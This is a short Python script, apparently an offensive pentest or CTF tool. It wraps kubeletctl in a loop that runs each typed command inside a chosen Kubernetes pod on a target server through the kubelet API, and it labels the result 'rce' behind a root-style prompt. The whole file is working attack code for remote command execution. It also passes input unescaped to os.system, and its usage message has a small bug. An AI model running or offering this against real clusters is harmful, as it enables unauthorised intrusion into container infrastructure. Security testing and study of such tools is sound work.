#!/usr/bin/env python3
import os
import sys


server = sys.argv[1]
container = sys.argv[2]

if (server == '' or container == ''):
	print('Usage: python3 '+sys.argv[1]+' 10.10.20.40 ngnix')
else:
	while(True):
		try:
			cmd = input('[cmd]:~# ')
			if (cmd == 'exit' or cmd == 'quit'):
				break
			else:
				rce = os.system(f'./kubeletctl --server {server} exec "{cmd}" -p {container} -c {container}')
	
		except(KeyboardInterrupt):
			pass